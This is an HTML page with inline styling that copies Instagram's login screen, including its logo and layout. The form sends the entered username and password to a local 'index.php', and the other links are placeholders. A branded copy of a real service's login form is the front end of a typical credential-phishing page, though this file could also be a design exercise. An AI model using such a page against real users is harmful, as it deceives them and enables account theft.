<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Login Page</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #fafafa;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-container {
      background-color: #fff;
      border: 1px solid #dbdbdb;
      padding: 40px;
      width: 350px;
      text-align: center;
      border-radius: 8px;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
    }

    .login-container img {
      width: 175px;
      margin-bottom: 20px;
    }

    .input-group {
      margin-bottom: 15px;
    }

    .input-group input {
      width: 100%;
      padding: 10px;
      margin: 5px 0;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
      background-color: #fafafa;
      font-size: 14px;
    }

    .login-btn {
      background-color: #0095f6;
      color: white;
      border: none;
      padding: 10px;
      width: 100%;
      border-radius: 4px;
      font-size: 14px;
      font-weight: bold;
      cursor: pointer;
    }

    .login-btn:hover {
      background-color: #007dc5;
    }

    .separator {
      display: flex;
      align-items: center;
      margin: 20px 0;
    }

    .separator div {
      flex: 1;
      height: 1px;
      background-color: #dbdbdb;
    }

    .separator span {
      margin: 0 10px;
      color: #8e8e8e;
      font-size: 12px;
      font-weight: bold;
    }

    .signup-link {
      margin-top: 20px;
      font-size: 14px;
    }

    .signup-link a {
      color: #0095f6;
      text-decoration: none;
      font-weight: bold;
    }
  </style>
</head>
<body>

  <div class="login-container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/800px-Instagram_logo_2022.svg.png" alt="Instagram logo">
    
    <form action="index.php" method="POST">
      <div class="input-group">
        <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
      </div>
      <div class="input-group">
        <input type="password" id="password" name="password" placeholder="Password" required>
      </div>
      <button class="login-btn" type="submit">Log In</button>
    </form>

    <div class="separator">
      <div></div>
      <span>OR</span>
      <div></div>
    </div>

    <div>
      <a href="#" style="color: #385185; text-decoration: none; font-size: 14px;">Log in with Facebook</a>
    </div>

    <div style="margin-top: 10px;">
      <a href="#" style="color: #00376b; font-size: 12px; text-decoration: none;">Forgot password?</a>
    </div>

    <div class="signup-link">
      Don't have an account? <a href="#">Sign up</a>
    </div>
  </div>

</body>
</html>
